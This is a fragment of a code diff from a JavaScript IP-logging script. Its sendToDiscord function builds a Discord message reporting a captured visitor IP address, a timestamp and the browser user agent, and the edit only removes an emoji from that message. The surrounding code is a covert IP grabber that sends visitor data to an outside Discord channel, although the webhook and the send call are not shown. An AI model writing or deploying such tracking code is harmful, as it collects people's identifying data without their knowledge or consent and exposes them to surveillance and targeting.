@@ -30,7 +30,7 @@ async function sendToDiscord(ip) {
         }
 
         const discordPayload = {
-            content: `🌐 IP Logged\n**IP:** ${ip}\n**Time:** ${new Date().toLocaleString()}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}...`,
+            content: `IP Logged\n**IP:** ${ip}\n**Time:** ${new Date().toLocaleString()}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}...`,
             embeds: [
                 {
                     title: "IP Address Captured",
